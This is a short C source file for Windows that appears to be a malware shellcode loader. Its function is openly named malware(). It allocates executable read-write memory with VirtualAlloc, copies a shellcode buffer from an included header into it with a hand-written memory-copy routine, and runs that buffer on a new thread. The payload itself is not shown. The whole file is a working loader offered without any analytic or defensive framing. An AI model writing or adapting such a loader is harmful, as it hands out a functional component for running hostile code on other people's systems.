#include <windows.h>
#include "shellcode.h"

PVOID VxMoveMemory(
	_Inout_ PVOID dest,
	_In_    const PVOID src,
	_In_    SIZE_T len
);

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = (char*)dest;
	char* s = (char*)src;
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}

int malware(void) {

	SIZE_T size_shellcode = sizeof(buf);

	PVOID ptr = NULL;
	HANDLE hThread = NULL;

	ptr = VirtualAlloc(
		NULL, 
		size_shellcode, 
		(MEM_COMMIT | MEM_RESERVE),
		PAGE_EXECUTE_READWRITE);

	if (ptr == NULL) {
		return EXIT_FAILURE;
	}

	VxMoveMemory(ptr, buf, size_shellcode);

	hThread = CreateThread(
		NULL, 
		0, 
		(LPTHREAD_START_ROUTINE)ptr, 
		NULL, 
		0, 
		0);

	WaitForSingleObject(hThread, INFINITE);
	return 0;
}
